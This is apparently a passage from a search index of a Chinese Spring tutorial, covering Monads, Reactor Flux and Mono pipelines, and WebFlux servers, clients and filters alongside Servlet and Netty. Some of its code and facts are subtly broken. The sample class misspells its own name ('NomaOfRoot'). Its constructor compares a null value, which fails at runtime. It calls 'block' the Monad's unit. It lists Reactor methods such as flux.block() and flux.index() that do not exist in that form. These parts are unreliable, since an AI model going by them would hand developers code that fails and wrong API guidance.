\u4e3a\u4f8b\u5b50\uff0c\u4f8b\u5982\u7528\u6237\u8f93\u5165\u4e00\u4e2a\u6570\u5b57\uff0c\u4f60\u60f3\u8981\u5bf9\u8fd9\u4e2a\u6570\u5b57\u5f00\u6839\u53f7\uff0c\u4f46\u662f\u7528\u6237\u53ef\u80fd\u8f93\u5165\u4e86\u8d1f\u6570\uff0c\u6216\u8005\u662f\u7a7a\u503c\u3002\u8fd9\u65f6\u5019\uff0c\u4f60\u5c31\u9700\u8981\u5bf9\u8fd9\u4e2a\u6570\u5b57\u8fdb\u884c\u68c0\u67e5\uff0c\u7136\u540e\u518d\u8fdb\u884c\u5f00\u6839\u53f7\u3002\u8fd9\u4e2a\u68c0\u67e5\u7684\u8fc7\u7a0b\u5c31\u662f Monad \u7684 bind \u8fc7\u7a0b\u3002 \u4f8b\u5982\uff0c\u4e0b\u9762\u7684\u4ee3\u7801\u53ef\u4ee5\u5b8c\u6210\u8fd9\u4e2a Nomad \u7684\u8fc7\u7a0b\u3002 class NomadOfRoot { private final Double value; private final boolean isNegative; public NomadOfRoot(Double value) { this.value = value; this.isNegative = value < 0; } public NomadOfRoot root() { if (isNegative || value == null) { return new NomadOfRoot(null); } else { return new NomadOfRoot((Double) Math.sqrt(value)); } } public NomaOfRoot add(NomadOfRoot other) { if (value == null || other.value == null) { return new NomadOfRoot(null); } else { return new NomadOfRoot(value + other.value); } } public Double getValue() { return value; } } Double result = ( new NomadOfRoot(1.0) .add(new NomadOfRoot(2.0).root()) .root() .add(new NomadOfRoot(-3.0)) .root() .getValue() ); \u8fd9\u6837\u5b50\uff0c\u5982\u679c\u6211\u4eec\u7684\u6240\u6709\u63a5\u53e3\u90fd\u8fd4\u56de NomadOfRoot\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u4e0d\u7528\u518d\u505a\u989d\u5916\u7684\u68c0\u67e5\u4e86\uff0c\u56e0\u4e3a NomadOfRoot \u4f1a\u81ea\u52a8\u68c0\u67e5\u5e76\u8fd4\u56de\u6b63\u786e\u7684\u503c\u3002 \u76ee\u524d\u6211\u4eec\u7684\u64cd\u4f5c\u8fd8\u5f88\u5c11\u3002\u4f46\u662f\u5982\u679c\u8981\u94fe\u5f0f\u8c03\u7528\u51e0\u5341\u4e2a\u65b9\u6cd5\u5462\uff1f\u8fd9\u65f6\u5019 Monad \u5c31\u663e\u5f97\u5f88\u65b9\u4fbf\u4e86\u3002","title":"Monad"},{"location":"12/#monad_1","text":"\u54cd\u5e94\u5f0f\u7f16\u7a0b\u672c\u8d28\u5c31\u662f\u5c06\u6570\u636e\u5305\u88c5\u6210\u5f02\u6b65 Monad\uff0c\u8fd9\u4e2a Monad \u8981\u4e48\u5904\u4e8e Pending \u9636\u6bb5\uff0c\u6ca1\u6709\u6c42\u503c\uff1b\u8981\u4e48\u5df2\u7ecf\u5b8c\u6210\uff0c\u7136\u540e\u5bf9\u8fd9\u4e2a Monad \u8fdb\u884c\u64cd\u4f5c\u3002\u8fd9\u4e2a\u64cd\u4f5c\u662f\u4e00\u4e2a\u7ba1\u7ebf\uff0c\u5b83\u662f\u4e00\u4e2a\u94fe\u5f0f\u7684\u64cd\u4f5c\uff0c\u6bcf\u4e2a\u64cd\u4f5c\u90fd\u662f\u4e00\u4e2a Monad\uff0c\u8fd9\u4e2a Monad \u4f1a\u5728\u6570\u636e\u5230\u8fbe\u7684\u65f6\u5019\u8fdb\u884c\u64cd\u4f5c\u3002 \u5728 Reactor \u4e2d\uff0c\u8fd9\u4e2a Monad \u662f Flux \u7c7b\uff0cMono \u5219\u662f Flux \u7684\u7279\u4f8b\u3002\u5bf9\u6bd4\u4e0a\u9762\u5bf9 Monad \u7684\u4ecb\u7ecd\uff0c\u6211\u4eec\u5217\u51fa Flux \u7684\u4e09\u4e2a\u8981\u7d20\uff1a \u7c7b\u578b\u6784\u9020\u5668\uff1a\u4f7f\u7528 Flux.just \u6765\u6784\u9020\u4e00\u4e2a Flux\u3002\u4f46\u6ce8\u610f\uff0cFlux \u4fdd\u5b58\u7684\u662f\u4e00\u4e2a\u5217\u8868\uff0c\u800c\u4e0d\u662f\u4e00\u4e2a\u503c\uff0c\u56e0\u6b64\uff0c\u4f8b\u5982 Flux<Integer> \uff0c\u53ef\u4ee5\u4fdd\u5b58\u591a\u4e2a Integer\uff0c\u8981\u8fd9\u6837\u5199 Flux.just(1, 2, 3) \u3002 unit\uff1a\u8981\u628a Flux \u5bf9\u8c61\u53d8\u6210\u666e\u901a\u7684\u503c\uff0c\u53ef\u4ee5\u4f7f\u7528 block \u65b9\u6cd5\uff0c\u4f8b\u5982 Flux.just(1).blockFirst() \u3002 bind\uff1aFlux \u7684 bind \u662f map \uff0c flatMap \uff0c filter \u7b49\u65b9\u6cd5\u3002 \u800c Mono \u7c7b\u662f\u4e00\u79cd\u7279\u6b8a\u7684 Flux\uff0c\u5b83\u53ea\u80fd\u4fdd\u5b58\u4e00\u4e2a\u503c\u3002\u663e\u7136\uff0cFlux \u53ef\u4ee5\u88ab\u62c6\u6210\u5f88\u591a\u4e2a Mono\uff0c\u800c Mono \u4e5f\u53ef\u4ee5\u88ab\u5408\u5e76\u6210\u4e00\u4e2a Flux\u3002\u524d\u8005\u4f7f\u7528 next \u65b9\u6cd5\uff0c\u540e\u8005\u4f7f\u7528 concat \u65b9\u6cd5\u3002","title":"\u54cd\u5e94\u5f0f\u7f16\u7a0b\u4e2d\u7684 Monad"},{"location":"12/#publisher-subscribe-pipe","text":"Publisher \u4e0e Subscriber \u662f Reactor \u7684\u4e24\u4e2a\u6838\u5fc3\u63a5\u53e3\u3002Publisher \u662f\u4e00\u4e2a\u751f\u4ea7\u8005\uff0c\u5b83\u53ef\u4ee5\u751f\u4ea7\u6570\u636e\u3002Subscriber \u662f\u4e00\u4e2a\u6d88\u8d39\u8005\uff0c\u5b83\u53ef\u4ee5\u6d88\u8d39\u6570\u636e\u3002\u7b80\u5355\u7684\u6765\u8bf4\uff0cPublisher \u5fc5\u987b\u4ea7\u751f Flux\uff0c\u800c Subscriber \u5fc5\u987b\u6d88\u8d39 Flux\u3002 \u4f8b\u5982\uff0c\u4e0b\u9762\u7684\u4ee3\u7801\u662f\u4e00\u4e2a Publisher\uff0c Flux<Integer> publisher = Flux.just(1, 2, 3); \u800c\u4e0b\u9762\u7684\u4ee3\u7801\u662f\u4e00\u4e2a Subscriber\uff0c publisher.subscribe(System.out::println); \u5f53\u7136\uff0c\u628a\u6240\u6709\u6570\u636e\u53d6\u51fa\u6765\u4e5f\u7b97\u662f\u4e00\u79cd\u6d88\u8d39\uff0c\u8fd9\u65f6\u5019\u53ef\u4ee5\u4f7f\u7528 block \u65b9\u6cd5\u3002 publisher.blockLast(); \u800c\u6570\u636e\u4e4b\u95f4\u7684\u8f6c\u6362\uff0c\u5219\u662f\u901a\u8fc7\u7ba1\u7ebf\u65b9\u6cd5\uff08Pipe\uff09\u6765\u5b9e\u73b0\u7684\u3002\u5177\u4f53\u800c\u8a00\uff0c map \u65b9\u6cd5\u662f\u6700\u5e38\u7528\u7684 Pipe \u65b9\u6cd5\uff0c\u5b83\u53ef\u4ee5\u5bf9\u6570\u636e\u8fdb\u884c\u8f6c\u6362\u3002\u4f8b\u5982\uff0c Flux<Integer> publisher = Flux.just(1, 2, 3); List<Integer> l = publisher.map(i -> i * 2).collectList().block(); \u7efc\u4e0a\uff0c\u4e00\u4e2a\u5b8c\u6574\u7684\u7ba1\u7ebf\u5c31\u662f\uff0cpublisher \u4ece\u4e00\u822c\u7684\u6570\u636e\u8f6c\u6362\u6210 Flux\uff0c\u82e5\u5e72 Pipe \u65b9\u6cd5\u5bf9\u6570\u636e\u8fdb\u884c\u8f6c\u6362\uff0c\u4ece Flux \u8f6c\u6210 Flux\uff0c\u6700\u540e\u901a\u8fc7 subscribe\u65b9\u6cd5\u6d88\u8d39\u6570\u636e\u3002 \u5e38\u7528\u7684\u5185\u5efa Publisher \u6709\uff0c Flux.just \uff1a\u5c06\u4e00\u4e2a\u6216\u82e5\u5e72\u4e2a\u5143\u7d20\u8f6c\u6362\u6210 Flux\u3002 Flux.fromArray \uff1a\u5c06\u4e00\u4e2a\u6570\u7ec4\u8f6c\u6362\u6210 Flux\u3002 Flux.fromIterable \uff1a\u5c06\u4e00\u4e2a Iterable \u8f6c\u6362\u6210 Flux\u3002 Flux.fromStream \uff1a\u5c06\u4e00\u4e2a Stream \u8f6c\u6362\u6210 Flux\u3002 Flux.range \uff1a\u5c06\u4e00\u4e2a\u8303\u56f4\u5185\u7684\u6574\u6570\u8f6c\u6362\u6210 Flux\u3002 Mono.just \uff1a\u5c06\u4e00\u4e2a\u5143\u7d20\u8f6c\u6362\u6210 Mono\u3002 Mono.empty \uff1a\u5c06\u4e00\u4e2a\u7a7a\u503c\u8f6c\u6362\u6210 Mono\u3002 Mono.error \uff1a\u5c06\u4e00\u4e2a\u9519\u8bef\u8f6c\u6362\u6210 Mono\u3002 \u5e38\u7528\u7684 Pipe \u65b9\u6cd5\u6709\uff0c flux.map(func) \uff1a\u5bf9 Flux \u4e2d\u7684\u6bcf\u4e2a\u5143\u7d20\uff0c\u6267\u884c\u51fd\u6570\uff0c\u5c06\u8fd4\u56de\u503c\u6536\u96c6\u6210\u65b0\u7684 Flux\u3002 flux.flatMap(func) \uff1a\u5bf9 Flux \u4e2d\u7684\u6bcf\u4e2a\u5143\u7d20\uff0c\u6267\u884c\u51fd\u6570\uff0c\u51fd\u6570\u5e94\u5f53\u8fd4\u56de\u4e00\u4e2a\u5143\u7d20\u5217\u8868\uff0c\u6700\u540e\u4f1a\u628a\u6bcf\u4e2a\u5143\u7d20\u5217\u8868\u8fde\u63a5\u6210\u4e00\u4e2a\u65b0\u7684 Flux\u3002 flux.filter(func) \uff1a\u5bf9 Flux \u4e2d\u7684\u6bcf\u4e2a\u5143\u7d20\uff0c\u6267\u884c\u51fd\u6570\uff0c\u51fd\u6570\u5e94\u5f53\u8fd4\u56de\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u6700\u540e\u4f1a\u628a\u6240\u6709\u8fd4\u56de true \u7684\u5143\u7d20\u6536\u96c6\u6210\u65b0\u7684 Flux\u3002 flux.collectList() \uff1a\u5c06 Flux \u4e2d\u7684\u6240\u6709\u5143\u7d20\u6536\u96c6\u6210\u4e00\u4e2a\u5217\u8868\u7684 Mono\u3002\u5373 Flux<T> \u53d8\u6210 Mono<List<T>> \u3002 flux.first() \uff1a\u5c06 Flux \u4e2d\u7684\u7b2c\u4e00\u4e2a\u5143\u7d20\u6536\u96c6\u6210\u4e00\u4e2a Mono\u3002 flux.last() \uff1a\u5c06 Flux \u4e2d\u7684\u6700\u540e\u4e00\u4e2a\u5143\u7d20\u6536\u96c6\u6210\u4e00\u4e2a Mono\u3002 flux.index(index) \uff1a\u5c06 Flux \u4e2d\u7684\u7b2c index \u4e2a\u5143\u7d20\u6536\u96c6\u6210\u4e00\u4e2a Mono\u3002 mono.map(func) \uff1a\u5bf9 Mono \u4e2d\u7684\u5143\u7d20\uff0c\u6267\u884c\u51fd\u6570\uff0c\u5c06\u8fd4\u56de\u503c\u6536\u96c6\u6210\u65b0\u7684 Mono\u3002 \u5e38\u7528\u7684 Subscribe \u65b9\u6cd5\u6709\uff0c flux.subscribe() \uff1a\u8ba2\u9605\u4e00\u4e2a Flux\uff0c\u4f46\u662f\u4e0d\u505a\u4efb\u4f55\u4e8b\u60c5\u3002 flux.subscribe(func) \uff1a\u8ba2\u9605\u4e00\u4e2a Flux\uff0c\u5bf9\u6bcf\u4e2a\u5143\u7d20\u6267\u884c\u51fd\u6570\u3002 flux.blockLast() \uff1a\u8ba2\u9605\u4e00\u4e2a Flux\uff0c\u53d6\u51fa\u6700\u540e\u4e00\u4e2a\u5143\u7d20\u3002 flux.blockFirst() \uff1a\u8ba2\u9605\u4e00\u4e2a Flux\uff0c\u53d6\u51fa\u7b2c\u4e00\u4e2a\u5143\u7d20\u3002 flux.block() \uff1a\u8ba2\u9605\u4e00\u4e2a Flux\uff0c\u53d6\u51fa\u6240\u6709\u5143\u7d20\u3002 mono.block() \uff1a\u8ba2\u9605\u4e00\u4e2a Mono\uff0c\u53d6\u51fa\u5143\u7d20\u3002 mono.subscribe() \uff1a\u8ba2\u9605\u4e00\u4e2a Mono\uff0c\u4f46\u662f\u4e0d\u505a\u4efb\u4f55\u4e8b\u60c5\u3002 mono.subscribe(func) \uff1a\u8ba2\u9605\u4e00\u4e2a Mono\uff0c\u5bf9\u5143\u7d20\u6267\u884c\u51fd\u6570\u3002 \u6ce8\u610f\uff0c\u4e0a\u9762\u7684\u6240\u6709\u65b9\u6cd5\u53ea\u662f\u58f0\u660e\u7ba1\u7ebf\uff0c\u5e76\u4e0d\u4f1a\u771f\u6b63\u6267\u884c\u7ba1\u7ebf\u3002\u53ea\u6709 Subscribe \u65b9\u6cd5\u624d\u4f1a\u771f\u6b63\u6267\u884c\u7ba1\u7ebf\u3002\u6267\u884c\u65f6\uff0c\u5404\u4e2a\u5143\u7d20\u662f\u5f02\u6b65\u6267\u884c\u7684\u3002 \u6b64\u5916\uff0cSubscribe \u65b9\u6cd5\u4e0d\u80fd\u5d4c\u5957\u3002\u4e00\u65e6\u6570\u503c\u8fdb\u5165\u4e86 Monad\uff0c\u53ea\u80fd\u4f7f\u7528 Pipe \u65b9\u6cd5\u8fdb\u884c\u5904\u7406\u3002\u4f8b\u5982\uff0c\u5728 Webflux \u4e2d\uff0c\u6846\u67b6\u4f1a\u81ea\u52a8\u4e3a\u4f60 Subscibe Monad\uff0c\u56e0\u6b64\u4e0d\u80fd\u5728\u4ee3\u7801\u4e2d\u4f7f\u7528 Subscribe \u65b9\u6cd5\uff0c\u5904\u7406\u65f6\u5fc5\u987b\u4f7f\u7528\u54cd\u5e94\u5f0f\u8bed\u6cd5\u3002","title":"Publisher\uff0c Subscribe \u4e0e Pipe"},{"location":"13/","text":"Spring \u901f\u6210 Ch13 WebFlux \u524d\u9762\u6211\u4eec\u8bb2\u4e86 WebFlux \u57fa\u4e8e\u7684 Spring \u6846\u67b6\u548c Reactor \u6846\u67b6\uff0c\u73b0\u5728\u6211\u4eec\u6765\u770b\u770b WebFlux \u7684\u5177\u4f53\u7528\u6cd5\u3002 WebFlux REST Server \u9996\u5148\uff0c\u6211\u4eec\u6765\u770b\u770b WebFlux \u7684 REST \u670d\u52a1\u5668\u3002\u6211\u4eec\u5148\u521b\u5efa\u4e00\u4e2a WebFlux \u7684\u9879\u76ee\uff0c\u7136\u540e\u521b\u5efa\u4e00\u4e2a REST \u670d\u52a1\u5668\u3002 \u9996\u5148\uff0c\u6211\u4eec\u521b\u5efa\u4e00\u4e2a Spring \u9879\u76ee\uff0c\u7136\u540e\u6dfb\u52a0 WebFlux \u7684\u4f9d\u8d56\uff0c\u6ce8\u610f\uff0c\u5982\u679c\u4f60\u4e5f\u559c\u6b22\u7528 Spring Doc\uff0c\u6dfb\u52a0 WebFlux \u7684\u4f9d\u8d56\u800c\u4e0d\u662f WebMVC \u7684\u4f9d\u8d56\u3002\u9ed8\u8ba4\u5730\u5740\u4f9d\u7136\u5728 /swagger-ui.html \u3002 implementation 'org.springframework.boot:spring-boot-starter-webflux' implementation 'org.springdoc:springdoc-openapi-starter-webflux-ui:2.6.0' \u8981\u521b\u5efa\u4e00\u4e2a REST \u670d\u52a1\u5668\uff0c\u6211\u4eec\u9700\u8981\u521b\u5efa\u4e00\u4e2a Controller\uff0c\u7136\u540e\u5728 Controller \u91cc\u5b9a\u4e49 REST API\u3002 @RestController public class HelloController { @GetMapping(\"/hello\") public Mono<String> hello() { return Mono.just(\"Hello, WebFlux!\"); } } \u5f53\u7136\uff0c\u5982\u679c\u4f60\u6709 Service\uff0c\u5b83\u4eec\u4e5f\u53ef\u4ee5\u8fd4\u56de Mono \u6216 Flux\uff0c\u8fd9\u6837\u5c31\u53ef\u4ee5\u5f02\u6b65\u5904\u7406\u8bf7\u6c42\u3002 @Service public class HelloService { public Mono<String> hello() { return Mono.just(\"Hello, WebFlux!\"); } } @RestController @RequiredArgsConstructor public class HelloController { private final HelloService helloService; @GetMapping(\"/hello\") public Mono<String> hello() { return helloService.hello(); } } \u662f\u7684\uff0c\u660e\u9762\u4e0a\u548c Spring Web \u7684\u552f\u4e00\u533a\u522b\u662f\u8fd4\u56de\u503c\u662f Mono\u3002 \u5982\u679c\u6211\u4eec\u4e4b\u540e\u4f7f\u7528\u5176\u5b83\u7684\u5e93\uff0c\u4e5f\u8981\u4f7f\u7528 reactive \u7684\u7248\u672c\u3002 Servlet \u4e0e Netty \u5728\u672c\u8d28\u4e0a\uff0cSpring Web \u57fa\u4e8e Servlet\uff0c\u800c WebFlux \u57fa\u4e8e Netty\u3002 \u73b0\u5728\u4ece\u5e95\u5c42\u5f00\u59cb\uff0c\u6211\u4eec\u6765\u770b\u770b Servlet \u548c Netty \u7684\u533a\u522b\u3002 Servlet \u73b0\u5728\u5df2\u7ecf\u57fa\u672c\u6ca1\u4eba\u76f4\u63a5\u7528 Servlet \u4e86\uff0c\u4f46\u662f\u8981\u4e86\u89e3 Spring Web \u7684\u5e95\u5c42\uff0c\u6211\u4eec\u8fd8\u662f\u8981\u4e86\u89e3 Servlet\u3002 Servlet \u662f Java Web \u5f00\u53d1\u7684\u57fa\u7840\uff0c\u5b83\u662f\u4e00\u4e2a Java \u7c7b\uff0c\u7528\u4e8e\u5904\u7406 HTTP \u8bf7\u6c42\u548c\u54cd\u5e94\u3002Servlet \u901a\u8fc7\u7ee7\u627f HttpServlet \u7c7b\u6765\u5b9e\u73b0\u3002Servlet \u662f\u540c\u6b65\u7684\uff0c\u8fd9\u610f\u5473\u7740\u5f53\u4e00\u4e2a\u8bf7\u6c42\u5230\u6765\u65f6\uff0cServlet \u4f1a\u963b\u585e\u7ebf\u7a0b\uff0c\u76f4\u5230\u8bf7\u6c42\u5904\u7406\u5b8c\u6210\u3002\u8fd9\u610f\u5473\u7740 Servlet \u4e0d\u80fd\u5904\u7406\u5927\u91cf\u7684\u8bf7\u6c42\uff0c\u56e0\u4e3a\u6bcf\u4e2a\u8bf7\u6c42\u90fd\u4f1a\u5360\u7528\u4e00\u4e2a\u7ebf\u7a0b\u3002 \u8981\u521b\u5efa\u4e00\u4e2a Servlet\uff0c\u4f60\u9700\u8981\u7ee7\u627f HttpServlet \u7c7b\uff0c\u7136\u540e\u91cd\u5199 doGet \u548c doPost \u65b9\u6cd5\u3002 @WebServlet(\"/hello\") public class HelloServlet extends HttpServlet { @Override protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException { resp.getWriter().write(\"Hello, Servlet!\"); } } \u8981\u8fd0\u884c Servlet\uff0c\u4f60\u9700\u8981\u4e00\u4e2a Servlet \u5bb9\u5668\uff0c\u5982 Tomcat \u6216 Jetty\u3002\u5982\u679c\u662f\u7528 tomcat\uff0c\u4f60\u9700\u8981\u5728 web.xml \u4e2d\u914d\u7f6e Servlet\u3002 <web-app> <servlet> <servlet-name>hello</servlet-name> <servlet-class>com.example.HelloServlet</servlet-class> </servlet> <servlet-mapping> <servlet-name>hello</servlet-name> <url-pattern>/hello</url-pattern> </servlet-mapping> </web-app> \u7136\u540e\uff0c\u4f60\u9700\u8981\u5c06\u8fd9\u4e2a war \u5305\u90e8\u7f72\u5230 tomcat \u4e2d\u3002\u5177\u4f53\u800c\u8a00\uff0c\u9700\u8981\u5148\u7f16\u8bd1 war \u5305\uff0c\u7136\u540e\u5c06 war \u5305\u653e\u5230 tomcat \u7684 webapps \u76ee\u5f55\u4e0b\u3002 \u800c Spring Web \u672c\u8d28\u4e0a\u63d0\u4f9b\u4e86\u4e00\u4e2a DispatcherServlet\uff0c\u5b83\u662f\u4e00\u4e2a Servlet\uff0c\u7528\u6765\u628a\u4e0d\u540c\u7684\u8bf7\u6c42\u5206\u53d1\u7ed9\u4e0d\u540c\u7684 Controller\u3002\u914d\u7f6e DispatcherServlet \u4e5f\u662f\u901a\u8fc7 web.xml \u3002 <web-app> <servlet> <servlet-name>dispatcher</servlet-name> <servlet-class>org.springframework.web.servlet.DispatcherServlet</servlet-class> </servlet> <servlet-mapping> <servlet-name>dispatcher</servlet-name> <url-pattern>/</url-pattern> </servlet-mapping> </web-app> Netty \u548c Servlet \u4e00\u6837\uff0cNetty \u4e5f\u662f\u4e00\u4e2a HTTP \u670d\u52a1\u5668\u3002\u4f46\u662f Netty \u662f\u5f02\u6b65\u7684\uff0c\u8fd9\u610f\u5473\u7740\u5b83\u4e0d\u4f1a\u963b\u585e\u7ebf\u7a0b\u3002Netty \u662f\u4e00\u4e2a\u4e8b\u4ef6\u9a71\u52a8\u7684\u6846\u67b6\uff0c\u5b83\u4f7f\u7528\u4e86 Reactor \u6a21\u5f0f\uff0c\u8fd9\u610f\u5473\u7740\u5b83\u4f7f\u7528\u4e86\u4e8b\u4ef6\u5faa\u73af\u6765\u5904\u7406\u8bf7\u6c42\u3002 Spring WebFlux \u63d0\u4f9b\u4e86\u4e24\u5c42\u62bd\u8c61\uff0c\u4e00\u5c42\u662f http \u5f00\u5934\u7684\uff0c\u5982 HttpHandler \uff0c\u4e00\u5c42\u662f Web \u5f00\u5934\u7684\uff0c\u5982 WebHandler \u3002\u540e\u8005\u66f4\u9ad8\u7ea7\uff0c\u524d\u8005\u66f4\u5e95\u5c42\u3002 \u8981\u521b\u5efa\u4e00\u4e2a Netty \u670d\u52a1\u5668\uff0c\u4f60\u9700\u8981\u521b\u5efa\u4e00\u4e2a HttpServer \uff0c\u7136\u540e\u8bbe\u7f6e HttpHandler \u3002 public class HelloHandler implements HttpHandler { @Override public Mono<Void> handle(ServerHttpRequest request, ServerHttpResponse response) { return response.writeWith(Mono.just(response.bufferFactory().wrap(\"Hello, Netty!\".getBytes()))); } } public class NettyServer { public static void main(String[] args) { HttpHandler handler = new HelloHandler(); HttpServer server = HttpServer.create().host(\"localhost\").port(8080).handle(handler); server.bindNow(); } } \u53ef\u4ee5\u770b\u5230\uff0c\u4e0e Servlet \u5f88\u76f8\u4f3c\uff0c\u4e0d\u540c\u70b9\u4e00\u662f Netty \u662f\u5f02\u6b65\u7684\uff0c\u4e0d\u540c\u70b9\u4e8c\u662f Netty \u4e0d\u518d\u4f7f\u7528 xml \u914d\u7f6e\u3002 WebFlux Web Client \u4e4b\u524d\u6211\u4eec\u7528\u8fc7\u4e86 RestTemplate \uff0c\u800c\u5b83\u6709\u4e00\u4e2a\u5305\u88c5\u8fc7\u7684 RestClient \uff0c\u800c WebClient \u662f WebFlux \u7684\u5ba2\u6237\u7aef\u3002 \u5bf9\u4e8e RestClient \uff0c\u53ef\u4ee5\u7528\u6d41\u5f0f API \u6765\u6784\u5efa\u8bf7\u6c42\u3002 String result = restClient.get() .uri(\"https://example.com\") .retrieve() .body(String.class); System.out.println(result); \u800c WebClient \u4e5f\u662f\u7c7b\u4f3c\u7684\uff0c\u4f46\u662f\u5b83\u662f\u5f02\u6b65\u7684\u3002 WebClient client = WebClient.create(\"https://example.org\"); Mono<Person> result = client.get() .uri(\"/persons/{id}\", id).accept(MediaType.APPLICATION_JSON) .retrieve() .bodyToMono(Person.class); \u8fd4\u56de\u7684\u662f Mono \u6216 Flux\uff0c\u8fd9\u6837\u5c31\u53ef\u4ee5\u5f02\u6b65\u5904\u7406\u8bf7\u6c42\u3002 WebFlux Web Filter WebFlux \u4e5f\u6709 WebFilter \uff0c\u5b83\u662f\u4e00\u4e2a\u8fc7\u6ee4\u5668\uff0c\u53ef\u4ee5\u7528\u6765\u5904\u7406\u8bf7\u6c42\u548c\u54cd\u5e94\u3002 @Component public class LoggingWebFilter implements WebFilter { @Override public Mono<Void> filter(ServerWebExchange exchange, WebFilterChain chain) { System.out.println(\"Request: \" + exchange.getRequest().getPath()); return chain.filter(exchange).doOnSuccess(aVoid -> { System.out.println(\"Response: \" + exchange.getResponse().getStatusCode()); }); } }","title":"Spring WebFlux"},{"location":"13/#spring-ch13-webflux","text":"\u524d\u9762\u6211\u4eec\u8bb2\u4e86 WebFlux \u57fa\u4e8e\u7684 Spring \u6846\u67b6\u548c Reactor \u6846\u67b6\uff0c\u73b0\u5728\u6211\u4eec\u6765\u770b\u770b WebFlux \u7684\u5177\u4f53\u7528\u6cd5\u3002","title":"Spring \u901f\u6210 Ch13 WebFlux"},{"location":"13/#webflux-rest-server","text":"\u9996\u5148\uff0c\u6211\u4eec\u6765\u770b\u770b WebFlux \u7684 REST \u670d\u52a1\u5668\u3002\u6211\u4eec\u5148\u521b\u5efa\u4e00\u4e2a WebFlux \u7684\u9879\u76ee\uff0c\u7136\u540e\u521b\u5efa\u4e00\u4e2a REST \u670d\u52a1\u5668\u3002 \u9996\u5148\uff0c\u6211\u4eec\u521b\u5efa\u4e00\u4e2a Spring \u9879\u76ee\uff0c\u7136\u540e\u6dfb\u52a0 WebFlux \u7684\u4f9d\u8d56\uff0c\u6ce8\u610f\uff0c\u5982\u679c\u4f60\u4e5f\u559c\u6b22\u7528 Spring Doc\uff0c\u6dfb\u52a0 WebFlux \u7684\u4f9d\u8d56\u800c\u4e0d\u662f WebMVC \u7684\u4f9d\u8d56\u3002\u9ed8\u8ba4\u5730\u5740\u4f9d\u7136\u5728 /swagger-ui.html \u3002 implementation 'org.springframework.boot:spring-boot-starter-webflux' implementation 'org.springdoc:springdoc-openapi-starter-webflux-ui:2.6.0' \u8981\u521b\u5efa\u4e00\u4e2a REST \u670d\u52a1\u5668\uff0c\u6211\u4eec\u9700\u8981\u521b\u5efa\u4e00\u4e2a Controller\uff0c\u7136\u540e\u5728 Controller \u91cc\u5b9a\u4e49 REST API\u3002 @RestController public class HelloController { @GetMapping(\"/hello\") public Mono<String> hello() { return Mono.just(\"Hello, WebFlux!\"); } } \u5f53\u7136\uff0c\u5982\u679c\u4f60\u6709 Service\uff0c\u5b83\u4eec\u4e5f\u53ef\u4ee5\u8fd4\u56de Mono \u6216 Flux\uff0c\u8fd9\u6837\u5c31\u53ef\u4ee5\u5f02\u6b65\u5904\u7406\u8bf7\u6c42\u3002 @Service public class HelloService { public Mono<String> hello() { return Mono.just(\"Hello, WebFlux!\"); } } @RestController @RequiredArgsConstructor public class HelloController { private final HelloService helloService; @GetMapping(\"/hello\") public Mono<String> hello() { return helloService.hello(); } } \u662f\u7684\uff0c\u660e\u9762\u4e0a\u548c Spring Web \u7684\u552f\u4e00\u533a\u522b\u662f\u8fd4\u56de\u503c\u662f Mono\u3002 \u5982\u679c\u6211\u4eec\u4e4b\u540e\u4f7f\u7528\u5176\u5b83\u7684\u5e93\uff0c\u4e5f\u8981\u4f7f\u7528 reactive \u7684\u7248\u672c\u3002","title":"WebFlux REST Server"},{"location":"13/#servlet-netty","text":"\u5728\u672c\u8d28\u4e0a\uff0cSpring Web \u57fa\u4e8e Servlet\uff0c\u800c WebFlux \u57fa\u4e8e Netty\u3002 \u73b0\u5728\u4ece\u5e95\u5c42\u5f00\u59cb\uff0c\u6211\u4eec\u6765\u770b\u770b Servlet \u548c Netty \u7684\u533a\u522b\u3002","title":"Servlet \u4e0e Netty"},{"location":"13/#servlet","text":"\u73b0\u5728\u5df2\u7ecf\u57fa\u672c\u6ca1\u4eba\u76f4\u63a5\u7528 Servlet \u4e86\uff0c\u4f46\u662f\u8981\u4e86\u89e3 Spring Web \u7684\u5e95\u5c42\uff0c\u6211\u4eec\u8fd8\u662f\u8981\u4e86\u89e3 Servlet\u3002 Servlet \u662f Java Web \u5f00\u53d1\u7684\u57fa\u7840\uff0c\u5b83\u662f\u4e00\u4e2a Java \u7c7b\uff0c\u7528\u4e8e\u5904\u7406 HTTP \u8bf7\u6c42\u548c\u54cd\u5e94\u3002Servlet \u901a\u8fc7\u7ee7\u627f HttpServlet \u7c7b\u6765\u5b9e\u73b0\u3002Servlet \u662f\u540c\u6b65\u7684\uff0c\u8fd9\u610f\u5473\u7740\u5f53\u4e00\u4e2a\u8bf7\u6c42\u5230\u6765\u65f6\uff0cServlet \u4f1a\u963b\u585e\u7ebf\u7a0b\uff0c\u76f4\u5230\u8bf7\u6c42\u5904\u7406\u5b8c\u6210\u3002\u8fd9\u610f\u5473\u7740 Servlet \u4e0d\u80fd\u5904\u7406\u5927\u91cf\u7684\u8bf7\u6c42\uff0c\u56e0\u4e3a\u6bcf\u4e2a\u8bf7\u6c42\u90fd\u4f1a\u5360\u7528\u4e00\u4e2a\u7ebf\u7a0b\u3002 \u8981\u521b\u5efa\u4e00\u4e2a Servlet\uff0c\u4f60\u9700\u8981\u7ee7\u627f HttpServlet \u7c7b\uff0c\u7136\u540e\u91cd\u5199 doGet \u548c doPost \u65b9\u6cd5\u3002 @WebServlet(\"/hello\") public class HelloServlet extends HttpServlet { @Override protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException { resp.getWriter().write(\"Hello, Servlet!\"); } } \u8981\u8fd0\u884c Servlet\uff0c\u4f60\u9700\u8981\u4e00\u4e2a Servlet \u5bb9\u5668\uff0c\u5982 Tomcat \u6216 Jetty\u3002\u5982\u679c\u662f\u7528 tomcat\uff0c\u4f60\u9700\u8981\u5728 web.xml \u4e2d\u914d\u7f6e Servlet\u3002 <web-app> <servlet> <servlet-name>hello</servlet-name> <servlet-class>com.example.HelloServlet</servlet-class> </servlet> <servlet-mapping> <servlet-name>hello</servlet-name> <url-pattern>/hello</url-pattern> </servlet-mapping> </web-app> \u7136\u540e\uff0c\u4f60\u9700\u8981\u5c06\u8fd9\u4e2a war \u5305\u90e8\u7f72\u5230 tomcat \u4e2d\u3002\u5177\u4f53\u800c\u8a00\uff0c\u9700\u8981\u5148\u7f16\u8bd1 war \u5305\uff0c\u7136\u540e\u5c06 war \u5305\u653e\u5230 tomcat 